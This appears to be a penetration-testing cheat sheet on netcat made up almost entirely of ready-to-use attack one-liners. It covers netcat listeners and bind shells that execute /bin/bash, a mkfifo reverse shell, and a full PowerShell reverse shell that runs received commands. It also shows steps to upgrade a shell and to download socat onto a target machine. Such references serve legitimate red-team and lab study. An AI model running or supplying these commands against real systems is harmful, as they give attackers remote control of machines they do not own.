# NetCat (nc)

### Listening

{% code title="Reverse-Shell" %}
```sh
nc -lvnp <port-number>
# Listen - Verbose - resolve_host_name - Port_number
# -e can be used for executing. EX: nc -lvnp <Port> -e /bin/bash
```
{% endcode %}

{% code title="Bind-Shell" %}
```sh
nc -lvnp <PORT> -e /bin/bash
```
{% endcode %}



### Connect Back

{% code title="Reverse Shell" %}
```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
{% endcode %}

{% hint style="info" %}
for Powershell on new windows systems, there's a good code for connect back in reverse shell:

{% code overflow="wrap" %}
```bash
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}
{% endhint %}



{% code title="Bind Shell" %}
```sh
nc <target-ip> <chosen-port>

# OR

mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
{% endcode %}





***

## improving shell

### establishing shell

{% tabs %}
{% tab title="Method 1 : Python" %}
{% code title="Step 1" %}
```sh
python -c 'import pty;pty.spawn("/bin/bash")'
```
{% endcode %}

{% code title="Step 2" %}
```sh
export TERM=xterm
```
{% endcode %}

{% code title="Step 3" %}
```bash
stty raw -echo; fg
```
{% endcode %}

> with step 3 you would lose your terminal abilities. for getting them back just type `Reset`.
{% endtab %}

{% tab title="Method 2 : rlwrap (Recommended)" %}
```bash
sudo apt install rlwrap
```

```bash
sudo rlwrap nc -lvnp <port>
```

{% code title="for establishing the nc" fullWidth="true" %}
```bash
stty raw -echo; fg
```
{% endcode %}
{% endtab %}

{% tab title="Method 2 : socat" %}
{% code title="for establishing using this method you have to run one of these codes in target machin" overflow="wrap" %}
```bash
# for establishing using this method you have to run one of these codes in target machin

wget <LOCAL-IP>/socat -O /tmp/socat
# OR
sudo python3 -m http.server 80
```
{% endcode %}

you can do this :arrow\_down: for better results:

```bash
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```
{% endtab %}
{% endtabs %}

### fixing shell size

```sh
# on your own shell
stty -a

# after writing results, enter them into the shell using these on target's shell:
stty rows <number>
stty cols <number>
```
